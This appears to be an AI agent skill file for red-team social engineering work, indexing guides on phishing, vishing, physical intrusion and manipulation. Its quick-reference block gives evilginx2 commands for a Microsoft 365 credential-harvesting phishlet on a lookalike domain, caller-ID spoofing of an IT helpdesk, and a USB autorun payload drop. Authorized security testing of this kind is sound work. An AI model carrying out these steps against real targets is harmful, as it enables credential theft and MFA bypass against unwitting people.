---
name: agx-social-engineering
description: "social-engineering"
trigger_when: "social-engineering,social,engineering,skill,coverage,map,quick,reference,gophish,start,server,evilginx2"
source: antigravity-pentest-skills/
---
---
name: social-engineering
description: >-
  Use this skill when planning or executing authorized social engineering assessments,
  phishing campaigns, pretexting scenarios, vishing (voice phishing), smishing, physical
  intrusion attempts, or OSINT-driven target profiling. Covers: phishing email crafting
  with GoPhish, evilginx2 credential harvesting, pretexting scripts, vishing call guides,
  USB drop attacks, tailgating techniques, open-source intelligence gathering on targets,
  psychological manipulation principles, and reporting on social engineering findings.
  All techniques are for authorized red team engagements and security awareness testing only.
---

## Social Engineering Skill

Authorized social engineering techniques for red team engagements, penetration tests,
and security awareness assessments.

### Coverage Map

| Reference File | Contents |
|---|---|
| [phishing-campaigns.md](references/phishing-campaigns.md) | GoPhish setup, email templates, tracking, metrics |
| [evilginx-harvest.md](references/evilginx-harvest.md) | evilginx2 MFA bypass, phishlets, credential capture |
| [pretexting.md](references/pretexting.md) | Scenario scripts, impersonation personas, escalation |
| [vishing-smishing.md](references/vishing-smishing.md) | Call scripts, caller ID spoofing, SMS phishing |
| [osint-targeting.md](references/osint-targeting.md) | LinkedIn, OSINT tools, target profile building |
| [physical-intrusion.md](references/physical-intrusion.md) | Tailgating, badge cloning, USB drops, lock picking |
| [psychological-principles.md](references/psychological-principles.md) | Cialdini principles, cognitive biases, manipulation |
| [spear-phishing.md](references/spear-phishing.md) | Highly targeted attacks, whaling, business email compromise |
| [awareness-bypass.md](references/awareness-bypass.md) | Bypass security-aware targets, multi-stage attacks |
| [se-reporting.md](references/se-reporting.md) | Report template, metrics, awareness training recommendations |

### Quick Reference

```bash
## GoPhish - start server
./gophish  # admin: https://localhost:3333

## evilginx2
./evilginx -p ./phishlets/
> phishlets hostname o365 login.microsoftonline.YOURDOMAIN.com
> phishlets enable o365
> lures create o365
> lures get-url 0

## Caller ID spoof (Twilio)
## Set CallerID in Twilio console to victim's IT helpdesk number

## USB drop payload (Windows AutoRun)
## Create: autorun.inf + payload.exe → drop in parking lot
```
